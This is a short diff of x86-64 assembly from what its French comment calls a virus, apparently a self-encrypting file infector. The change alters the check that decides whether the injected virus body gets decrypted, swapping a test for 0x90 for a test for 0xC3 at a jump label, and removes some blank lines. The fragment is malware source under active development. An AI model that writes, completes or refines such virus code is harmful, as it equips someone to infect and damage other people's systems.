@@ -14,13 +14,11 @@ main:
     push rdi
     push rsi
 
-    lea rax, [rel jump + 4]
-    cmp byte [rax], 0x90                ; cette ligne permet d'encrypter uniquement si le virus est injecter
+    lea rax, [rel jump]
+    cmp byte [rax], 0xC3                ; cette ligne permet d'encrypter uniquement si le virus est injecter
     jz encrypted_start
 
 decrypte:
-
-
 
     mov rax, ENCRYPT_SIZE
     xor rdx, rdx
